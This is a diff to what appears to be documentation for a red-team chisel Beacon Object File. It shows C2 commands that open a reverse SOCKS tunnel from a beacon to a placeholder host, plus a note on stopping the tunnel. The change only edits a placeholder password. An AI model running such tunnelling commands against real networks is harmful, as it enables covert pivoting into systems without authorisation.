@@ -22,7 +22,7 @@ chisel server --port 8000 --reverse -v --auth "username:password"
 ```
 OST or other C2:
 ```
-exec_bof_async z "https://cdn.example.com R:1080:socks --auth username:pass  --max-retry-count 2"
+exec_bof_async z "https://cdn.example.com R:1080:socks --auth username:password  --max-retry-count 2"
 ```
 Since the BOF runs continuously, the easiest way to stop it, is to use it with `--max-retry-count` and close the server. The BOF will then retry to connect to the server and, when it fails, it terminates the execution.
 
